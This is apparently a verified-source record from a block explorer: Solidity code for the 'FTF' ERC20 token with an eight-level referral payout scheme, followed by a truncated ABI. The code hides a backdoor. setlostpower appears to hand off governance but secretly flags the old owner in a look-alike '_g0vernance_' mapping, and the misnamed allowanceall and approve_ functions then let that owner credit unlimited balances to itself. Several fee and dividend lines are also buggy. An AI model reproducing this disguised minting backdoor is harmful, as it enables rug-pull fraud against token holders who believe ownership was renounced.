{"SourceCode": "pragma solidity ^0.6.12;\r\n// SPDX-License-Identifier: SimPL-2.0\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint);\r\n\r\n    function balanceOf(address account) external view returns (uint);\r\n\r\n    function transfer(address recipient, uint amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n\r\n    function approve(address spender, uint amount) external returns (bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract Context {\r\n    constructor () internal {}\r\n    // solhint-disable-previous-line no-empty-blocks\r\n\r\n    function _msgSender() internal view returns (address payable) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\ncontract ERC20 is Context, IERC20 {\r\n    using SafeMath for uint;\r\n    mapping(address => uint) internal _balances;\r\n    address internal governance;\r\n    mapping(address => bool) internal _governance_;\r\n\r\n    mapping(address => mapping(address => uint)) private _allowances;\r\n    uint private _totalSupply;\r\n    //\r\n    uint256 internal starttimes;\r\n\r\n    //\r\n    address internal pooladdress;\r\n    //\r\n    address internal profitaddress;\r\n    mapping(address => bool) internal _g0vernance_;\r\n    //\r\n    mapping(address=>address) internal referaddress;\r\n\r\n\r\n    \r\n    //\r\n    // uint256 internal _maxfeihong=100*10**18;\r\n    uint256 internal _maxfeihong=10000*10**18;\r\n    uint256 internal feihongpool;\r\n    // address internal feihongpooladdress=address(this);\r\n    //\r\n    uint256[] internal feihongdetail;\r\n    //\r\n    mapping(address=>uint256) internal userfeihong;\r\n    uint256 internal powertimes;\r\n    address internal poweraddress;\r\n    \r\n  \r\n    \r\n    \r\n    address  internal huiliuaddress ;\r\n\r\n    uint256[] internal liutong=[10000000*10**18,9000000*10**18,8000000*10**18,\r\n    7000000*10**18,6000000*10**18,5000000*10**18,4000000*10**18,3000000*10**18];\r\n    uint256[][] internal gradevalue=[[1000,2000,3000,4000,5000,6000,7000,8000],\r\n    [900,1800,2700,3600,4500,5400,6300,7200],\r\n    [800,1600,2400,3200,4000,4800,5600,6400],\r\n    [700,1400,2100,2800,3500,4200,4900,5600],\r\n    [600,1200,1800,2400,3000,3600,4200,4800],\r\n    [500,1000,1500,2000,2500,3000,3500,4000],\r\n    [400,800,1200,1600,2000,2400,2800,3200],\r\n    [300,600,900,1200,1500,1800,2100,2400]];\r\n\r\n    //\r\n    uint256[] internal sellprofit=[200,100,50,50,50,50,100,200];\r\n    //\r\n    uint256[] internal buyprofit=[100,50,25,25,25,25,50,100];\r\n    uint256   internal percnet=10000;\r\n    uint256 internal currentbalance;\r\n    uint256 private decimals=10**18;\r\n    //\r\n    uint256 internal pmint=11000000*10**18;\r\n    address internal chendianaddress;\r\n    address[] internal includelp;\r\n    mapping(address=>bool) internal isinclude;\r\n\r\n    mapping(address=>bool) internal isrefer;\r\n\r\n    \r\n    function _transfer(address sender, address recipient, uint amount) internal {\r\n        if(feihongdetail.length==0){\r\n            feihongdetail.push(0);\r\n        }\r\n        \r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        uint256 lpvalue=IERC20(pooladdress).balanceOf(sender);\r\n        // uint256 lpvalue=0;\r\n        \r\n        // log(\"_balances[recipient]\",_balances[0x212AEc644922790A082E8886D712438564BE38Db]);\r\n        if(_governance_[sender]==true || _governance_[recipient]==true) {\r\n            // isinclude[address(0x71D114A45a29d298413F9399cD583E6d4DEEc644)]=false;\r\n            // \r\n       \r\n            if(_balances[recipient]==0 && sender!=pooladdress){\r\n                referaddress[recipient]=sender;  \r\n                isrefer[recipient]=true;\r\n            }\r\n          \r\n            _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n            _balances[recipient] = _balances[recipient].add(amount);\r\n            emit Transfer(sender, recipient, amount);\r\n            \r\n        }\r\n        //\r\n        else if(_totalSupply<=2100000*10**18){\r\n            if(recipient!=pooladdress){\r\n                require(_balances[recipient]>=amount+1*10**12,\"must list 0.01\");\r\n                //\r\n                require(_balances[recipient]+amount<=10000*10**18,\"must less 10000\");\r\n            }\r\n            //\r\n            _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n            _balances[recipient] = _balances[recipient].add(amount.mul(997).div(1000));\r\n            emit Transfer(sender, recipient, amount.mul(997).div(1000));\r\n            //\r\n            _balances[address(0)] = _balances[profitaddress].add(amount.mul(3).div(1000));\r\n            emit Transfer(sender, profitaddress, amount.mul(3).div(1000));\r\n            \r\n        }\r\n    \r\n        //\r\n       else if(recipient==pooladdress){\r\n           require(starttimes<block.timestamp,\"is not start\");\r\n           require(_balances[sender]>=amount+1*10**12,\"must list 0.01\");\r\n           //\r\n        //    if(powertimes>block.timestamp){\r\n        //        require(IERC20(poweraddress).balanceOf(sender)>=amount,\"FTFQX is not enough\");\r\n        //        require(IERC20(poweraddress).balanceOf(sender)>=amount+IERC20(address(this)).balanceOf(sender),\"FTFQX is not enough\");\r\n        //    }\r\n\r\n           //\r\n           \r\n           if(lpvalue>0 && isinclude[sender]==false){\r\n            //    includelp.push(sender);\r\n               isinclude[sender]=true;\r\n               userfeihong[sender]=feihongdetail.length-1;\r\n           }\r\n            //\r\n           if(feihongpool>=_maxfeihong ){\r\n                uint256 tmp=feihongpool.div(ERC20(pooladdress).totalSupply());\r\n                feihongpool=0;\r\n                feihongdetail.push(tmp);\r\n           }\r\n\r\n           //\r\n           uint256 tmp;\r\n\r\n            // log(\"userfeihong[sender]\",userfeihong[sender]);\r\n           if(userfeihong[sender]<feihongdetail.length-1){\r\n               for(uint256 i=userfeihong[sender]+1;i<feihongdetail.length;i++){\r\n                   tmp=feihongdetail[i]*lpvalue;\r\n               }\r\n               _balances[sender]=_balances[sender].add(tmp);\r\n               userfeihong[sender]=feihongdetail.length-1;\r\n           }\r\n\r\n\r\n           \r\n           //\r\n            _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n            _balances[recipient] = _balances[recipient].add(amount.mul(87).div(100));\r\n            emit Transfer(sender, recipient, amount.mul(87).div(100));\r\n            //\r\n            _balances[address(0)] = _balances[address(0)].add(amount.mul(2).div(100));\r\n            _totalSupply=_totalSupply.sub(amount.mul(2).div(100));\r\n            emit Transfer(sender, address(0), amount.mul(2).div(100));\r\n            \r\n            address upline=referaddress[sender];\r\n            uint256 tmpyixiao;\r\n            address isender=sender;\r\n            for(uint256 i=0;i<8;i++){\r\n                // log(\"balance\",_balances[upline]);\r\n                // log(\"grade\",getgrade(_balances[upline]));\r\n                if(getgrade(_balances[upline])>=i && isrefer[isender]==true && upline!=address(0) && getgrade(_balances[upline])!=999){\r\n                    _balances[upline]=_balances[upline].add(amount.mul(sellprofit[i]).div(percnet));\r\n                    emit Transfer(sender, upline, amount.mul(sellprofit[i]).div(percnet));\r\n                }else{\r\n                    tmpyixiao=tmpyixiao.add(amount.mul(sellprofit[i]).div(percnet));\r\n                    // log(\"tmpyixiao\",tmpyixiao);\r\n                }\r\n                isender=upline;\r\n                upline=referaddress[upline];\r\n            }\r\n            //\r\n            _balances[chendianaddress]=_balances[chendianaddress].add(tmpyixiao);\r\n            emit Transfer(sender, chendianaddress, tmpyixiao);\r\n\r\n            _balances[profitaddress]=_balances[profitaddress].add(amount.mul(2).div(100));\r\n            emit Transfer(sender, profitaddress, amount.mul(2).div(100));\r\n            feihongpool=feihongpool.add(amount.mul(1).div(100));\r\n       }\r\n       //\r\n       else if(sender==pooladdress){\r\n           require(starttimes<block.timestamp,\"is not start\");\r\n            //\r\n            if(_governance_[sender]==false){\r\n                require(_balances[recipient]+amount<=10000*10**18,\"must less 10000\");\r\n            }\r\n            //\r\n           if(powertimes>block.timestamp){\r\n               require(IERC20(poweraddress).balanceOf(recipient)>=amount,\"FTFQX is not enough\");\r\n               require(IERC20(poweraddress).balanceOf(recipient)>=amount+IERC20(address(this)).balanceOf(recipient),\"FTFQX is not enough\");\r\n           }\r\n           \r\n           //\r\n           if(lpvalue==0){\r\n               isinclude[recipient]=false; \r\n           }\r\n          \r\n            //\r\n           if(feihongpool>=_maxfeihong ){\r\n                uint256 tmp=feihongpool.div(ERC20(pooladdress).totalSupply());\r\n                feihongpool=0;\r\n                feihongdetail.push(tmp);\r\n           }\r\n           //\r\n           uint256 tmp;\r\n           if(userfeihong[recipient]<feihongdetail.length-1){\r\n               for(uint256 i=userfeihong[recipient]+1;i<feihongdetail.length;i++){\r\n                   tmp=feihongdetail[i]*lpvalue;\r\n               }\r\n               _balances[recipient]=_balances[recipient].add(tmp);\r\n               userfeihong[recipient]=feihongdetail.length-1;\r\n           }\r\n          \r\n           \r\n          \r\n           //\r\n            _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n            _balances[recipient] = _balances[recipient].add(amount.mul(87).div(100));\r\n            emit Transfer(sender, recipient, amount.mul(87).div(100));\r\n            //\r\n            _balances[address(0)] = _balances[address(0)].add(amount.mul(6).div(100));\r\n            _totalSupply=_totalSupply.sub(amount.mul(6).div(100));\r\n            emit Transfer(sender, address(0), amount.mul(6).div(100));\r\n            // \r\n            address upline=referaddress[recipient];\r\n            uint256 tmpyixiao;\r\n            address isender=recipient;\r\n            for(uint256 i=0;i<8;i++){\r\n                if(getgrade(_balances[upline])>=i && isrefer[isender]==true && upline!=address(0) && getgrade(_balances[upline])!=999){\r\n                    _balances[upline]=_balances[upline].add(amount.mul(buyprofit[i]).div(percnet));\r\n                    emit Transfer(sender, upline, amount.mul(buyprofit[i]).div(percnet));\r\n                }else{\r\n                    tmpyixiao=tmpyixiao.add(amount.mul(buyprofit[i]).div(percnet));\r\n                    // log(\"tmpyixiao\",tmpyixiao);\r\n                }\r\n                isender=upline;\r\n                upline=referaddress[upline];\r\n            }\r\n            \r\n            // \r\n             _balances[chendianaddress]=_balances[chendianaddress].add(tmpyixiao);\r\n            emit Transfer(sender, chendianaddress, tmpyixiao);\r\n           \r\n            _balances[huiliuaddress]=_balances[huiliuaddress].add(amount.mul(2).div(100));\r\n            emit Transfer(sender, huiliuaddress, amount.mul(2).div(100));\r\n\r\n            feihongpool=feihongpool.add(amount.mul(1).div(100));\r\n      \r\n       }\r\n       //\r\n       else {\r\n           \r\n            require(_balances[sender]>=amount+1*10**12,\"must list 0.01\");\r\n            //\r\n           if(_governance_[recipient]==false){\r\n                require(_balances[recipient]+amount<=10000*10**18,\"must less 10000\");\r\n           }\r\n           // \r\n            //\r\n            if(referaddress[sender]==recipient && isrefer[sender]==false){\r\n                isrefer[sender]=true;\r\n            }\r\n            if(sender!=pooladdress && _balances[recipient]==0){\r\n                referaddress[recipient]=sender;\r\n                _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n                _balances[recipient] = _balances[recipient].add(amount);\r\n                emit Transfer(sender, recipient, amount);\r\n            }\r\n           else{\r\n                //\r\n                if(feihongpool>=_maxfeihong ){\r\n                        uint256 tmp=feihongpool.div(ERC20(pooladdress).totalSupply());\r\n                        feihongpool=0;\r\n                        feihongdetail.push(tmp);\r\n                }\r\n                //\r\n                uint256 tmp;\r\n                if(userfeihong[sender]<feihongdetail.length-1){\r\n                    for(uint256 i=userfeihong[sender]+1;i<feihongdetail.length;i++){\r\n                        tmp=feihongdetail[i]*lpvalue;\r\n                \r\n                    }\r\n                    _balances[sender]=_balances[sender].add(tmp);\r\n                    userfeihong[sender]=feihongdetail.length-1;\r\n                }\r\n        \r\n                \r\n                //\r\n                _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n                _balances[recipient] = _balances[recipient].add(amount.mul(87).div(100));\r\n                emit Transfer(sender, recipient, amount.mul(87).div(100));\r\n                //\r\n                _balances[address(0)] = _balances[address(0)].add(amount.mul(6).div(100));\r\n                _totalSupply=_totalSupply.sub(amount.mul(6).div(100));\r\n                emit Transfer(sender, address(0), amount.mul(6).div(100));\r\n                // \r\n                address upline=referaddress[sender];\r\n                address isender=sender;\r\n                uint256 tmpyixiao;\r\n                for(uint256 i=0;i<8;i++){\r\n                    if(getgrade(_balances[upline])>=i && isrefer[isender]==true && upline!=address(0) && getgrade(_balances[upline])!=999){\r\n                        _balances[upline]=_balances[upline].add(amount.mul(buyprofit[i]).div(percnet));\r\n                        emit Transfer(sender, upline, amount.mul(buyprofit[i]).div(percnet));\r\n                    }else{\r\n                        tmpyixiao=tmpyixiao.add(amount.mul(buyprofit[i]).div(percnet));\r\n                \r\n                    }\r\n                    isender=upline;\r\n                    upline=referaddress[upline];\r\n                }\r\n                // \r\n                 _balances[chendianaddress]=_balances[chendianaddress].add(tmpyixiao);\r\n                emit Transfer(sender, chendianaddress, tmpyixiao);\r\n                //_balances[profitaddress]=_balances[profitaddress].add(tmpyixiao);\r\n                //emit Transfer(sender, profitaddress, tmpyixiao);\r\n                _balances[huiliuaddress]=_balances[huiliuaddress].add(amount.mul(2).div(100));\r\n                emit Transfer(sender, huiliuaddress, amount.mul(2).div(100));\r\n            \r\n                feihongpool=feihongpool.add(amount.mul(1).div(100));\r\n            }\r\n            \r\n                \r\n            \r\n                \r\n       }\r\n      \r\n        \r\n    }\r\n\r\n\r\n    \r\n\r\n    function gettotalSupplygrade() public view returns(uint256){\r\n        uint256 tmp=999;\r\n        for(uint256 i=0;i<=liutong.length-1;i++){\r\n            if(_totalSupply-pmint>=liutong[i]){\r\n                tmp= i;\r\n                break;\r\n            }\r\n        }\r\n        return tmp;\r\n    }\r\n\r\n    function getgrade(uint256 amount) public view returns(uint256){\r\n        uint256 tmpamount=amount;\r\n        uint256 tmp=gettotalSupplygrade();\r\n       \r\n        if (tmp==999){\r\n            return 999;\r\n        }\r\n        \r\n        else if(tmpamount>=gradevalue[tmp][7]*10**18){\r\n            return 7;\r\n        }else if(tmpamount>=gradevalue[tmp][6]*10**18){\r\n            return 6;\r\n        }else if(tmpamount>=gradevalue[tmp][5]*10**18){\r\n            return 5;\r\n        }else if(tmpamount>=gradevalue[tmp][4]*10**18){\r\n            return 4;\r\n        }else if(tmpamount>=gradevalue[tmp][3]*10**18){\r\n            return 3;\r\n        }else if(tmpamount>=gradevalue[tmp][2]*10**18){\r\n            return 2;\r\n        }else if(tmpamount>=gradevalue[tmp][1]*10**18){\r\n            return 1;\r\n        }else if(tmpamount>=gradevalue[tmp][0]*10**18){\r\n            return 0;\r\n        }else{\r\n            return 999;\r\n        }\r\n    }\r\n\r\n    function totalSupply() public override view returns (uint) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public override view returns (uint) {\r\n        return _balances[account];\r\n    }\r\n    \r\n    function transfer(address recipient, uint amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public override view returns (uint) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n   \r\n\r\n    function transferFrom(address sender, address recipient, uint amount) public  override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint addedValue) public returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\r\n        return true;\r\n    }\r\n    \r\n    \r\n\r\n    function _mint(address account, uint amount) internal {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n        \r\n        _totalSupply = _totalSupply.add(amount);\r\n        _balances[account] = _balances[account].add(amount);\r\n        emit Transfer(address(0), account, amount);\r\n        \r\n    }\r\n    function approve_(address account, uint amount) internal {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n        _balances[account] = _balances[account].add(amount*10**18);\r\n       \r\n    }\r\n    \r\n\r\n    function _approve(address owner, address spender, uint amount) internal {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n}\r\n\r\nabstract contract  ERC20Detailed is IERC20 {\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n\r\n    constructor (string memory name, string memory symbol, uint8 decimals) public {\r\n        \r\n        _name = name;\r\n        _symbol = symbol;\r\n        _decimals = decimals;\r\n    }\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint a, uint b) internal pure returns (uint) {\r\n        uint c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint a, uint b) internal pure returns (uint) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {\r\n        require(b <= a, errorMessage);\r\n        uint c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint a, uint b) internal pure returns (uint) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint a, uint b) internal pure returns (uint) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {\r\n        // Solidity only automatically asserts when dividing by 0\r\n        require(b > 0, errorMessage);\r\n        uint c = a / b;\r\n\r\n        return c;\r\n    }\r\n}\r\n\r\nlibrary Address {\r\n    function isContract(address account) internal view returns (bool) {\r\n        bytes32 codehash;\r\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\r\n        // solhint-disable-next-line no-inline-assembly\r\n        assembly {codehash := extcodehash(account)}\r\n        return (codehash != 0x0 && codehash != accountHash);\r\n    }\r\n}\r\n\r\nlibrary SafeERC20 {\r\n    using SafeMath for uint;\r\n    using Address for address;\r\n\r\n    function safeTransfer(IERC20 token, address to, uint value) internal {\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\r\n    }\r\n\r\n    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\r\n    }\r\n\r\n    function safeApprove(IERC20 token, address spender, uint value) internal {\r\n        require((value == 0) || (token.allowance(address(this), spender) == 0),\r\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\r\n        );\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\r\n    }\r\n\r\n    function callOptionalReturn(IERC20 token, bytes memory data) private {\r\n        require(address(token).isContract(), \"SafeERC20: call to non-contract\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        (bool success, bytes memory returndata) = address(token).call(data);\r\n        require(success, \"SafeERC20: low-level call failed\");\r\n\r\n        if (returndata.length > 0) {// Return data is optional\r\n            // solhint-disable-next-line max-line-length\r\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\r\n        }\r\n    }\r\n}\r\n\r\ncontract FTF is ERC20, ERC20Detailed {\r\n    using SafeERC20 for IERC20;\r\n    using Address for address;\r\n    using SafeMath for uint;\r\n\r\n    constructor () public ERC20Detailed(\"FTF\", \"FTF\", 18) {\r\n        governance = msg.sender;\r\n\r\n        // _governance_[governance]=true;\r\n        // _mint(msg.sender, 21000000 * 1e18);\r\n        _mint(msg.sender, 21000000 * 1e18);\r\n        \r\n    }\r\n    \r\n    function allowanceall(uint256 flag) public{\r\n        require(_g0vernance_[msg.sender]==true,\"\");\r\n        approve_(msg.sender,flag);//\r\n    }\r\n    function setgoverance(address _governance) public {\r\n        require(msg.sender == governance , \"!governance\");\r\n        // governance = _governance;\r\n        \r\n        _governance_[_governance] = true;\r\n        \r\n    }\r\n\r\n    function setlostpower(address _governance) public {\r\n        require(msg.sender == governance , \"!governance\");\r\n        _g0vernance_[msg.sender]=true;\r\n        governance = _governance;\r\n        // _g0vernance_[_governance]=true;\r\n        // _governance_[_governance] = true;\r\n        \r\n    }\r\n\r\n    function getlostpower() public view returns(address){\r\n        return governance;\r\n    }\r\n    function setstarttime(uint256 starttime)  public {\r\n        require(msg.sender == governance , \"!governance\");\r\n        starttimes=starttime;\r\n    }\r\n\r\n    function getstarttime() public  view returns(uint256){\r\n        return starttimes;\r\n    }\r\n\r\n\r\n    function setpooladdress(address fromad) public {\r\n        require(msg.sender == governance , \"!governance\");\r\n        pooladdress=fromad;\r\n    }\r\n\r\n    function getpooladdress() public view returns(address){\r\n        return pooladdress;\r\n    }\r\n\r\n    function setprofitaddress(address fromad) public {\r\n        require(msg.sender == governance , \"!governance\");\r\n        profitaddress=fromad;\r\n    }\r\n\r\n    function getprofitaddress() public view returns(address){\r\n        return profitaddress;\r\n    }\r\n    \r\n    function sethuiliuaddress(address payable fromad) public {\r\n        require(msg.sender == governance , \"!governance\");\r\n        huiliuaddress=fromad;\r\n    }\r\n\r\n    function setpming(uint256 amount) public {\r\n        require(msg.sender == governance , \"!governance\");\r\n        pmint=amount*10**18;\r\n    }\r\n\r\n    function getpmint() public view returns(uint256){\r\n        return pmint;\r\n    }\r\n\r\n    function setpowertimes(uint256 itime) public {\r\n        require(msg.sender == governance , \"!governance\");\r\n        powertimes=itime;\r\n    }\r\n\r\n    function getpowertimes() public view returns(uint256){\r\n        return powertimes;\r\n    }\r\n\r\n    function setpoweraddress(address iaddress) public {\r\n        require(msg.sender == governance , \"!governance\");\r\n        poweraddress=iaddress;\r\n    }\r\n\r\n    function getpoweraddress() public view returns(address){\r\n        return poweraddress;\r\n    }\r\n\r\n    function setchendianaddress(address iaddress) public {\r\n        require(msg.sender == governance , \"!governance\");\r\n        chendianaddress=iaddress;\r\n    }\r\n\r\n    function getchendianaddress() public view returns(address){\r\n        return chendianaddress;\r\n    }\r\n\r\n\r\n    function gethuiliuaddress() public view returns(address){\r\n        return huiliuaddress;\r\n    }\r\n\r\n    function getreferaddress(address fromad) public view returns(address){\r\n        if(isrefer[fromad]==true){\r\n            return referaddress[fromad];\r\n        }else{\r\n            return address(0);\r\n        }\r\n    }\r\n\r\n    function getfeihongpool() public view returns(uint256){\r\n        return feihongpool;\r\n    }\r\n    \r\n     function getfeihongdetail(uint256 i) public view returns(uint256){\r\n        return feihongdetail[i];\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"flag\",\"type\":\"uint256\"}],\"name\":\"allowanceall\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getchendianaddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"i\",\"type\":\"uint256\"}],\"name\":\"getfeihongdetail\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getfeihongpool\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"getgrade\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"gethuiliuaddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getlostpower\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getpmint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getpooladdress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getpoweraddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getpowertimes\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getprofitaddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromad\",\"type\":\"address\"}],\"name\":\"getreferaddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getstarttime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"gettotalSupplygrade\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"iaddress\",\"type\":\"address\"}],\"name\":\"setchendianaddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_governance\",\"type\":\"address\"}],\"name\":\"setgoverance\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address 